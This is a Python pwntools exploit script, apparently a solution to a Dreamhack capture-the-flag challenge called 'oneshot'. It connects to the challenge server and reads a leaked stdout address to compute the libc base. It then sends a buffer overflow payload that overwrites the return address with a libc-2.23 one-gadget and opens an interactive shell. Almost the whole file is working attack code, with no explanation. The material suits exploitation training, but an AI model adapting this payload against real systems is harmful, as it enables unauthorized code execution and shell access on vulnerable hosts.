from pwn import *
def slog(n, m): return success(": ".join([n, hex(m)]))

context.log_level = 'debug'

p = remote("host1.dreamhack.games", 16347)
# p = process("./oneshot")
libc = ELF("./libc.so.6") #libc-2.23
# gdb.attach(p)

# [1] Get information about buf
buf2sfp = 16
# buf2ret = buf2cnry+0x8+0x8
og = 0x45216

slog("buf2sfp", buf2sfp)
print(libc.symbols["_IO_2_1_stdout_"])

p.recvuntil(b"stdout: ")
tmp=p.recvline() #64bit
print(tmp[:-1])
stdout = int(tmp[:-1], 16)

# [2] Get libc_base
slog("stdout", stdout)
libc_base = stdout - 3954208
slog("libc_base", libc_base)
goto_oneshot = libc_base + og
slog("go_oneshot", goto_oneshot)

payload = b"A"*(buf2sfp)+b"\x00"*0x10+b"B"*0x8
payload += p64(goto_oneshot)

p.recvuntil(b"MSG: ")
p.send(payload) #sendline is have \n
p.recvline()

p.interactive()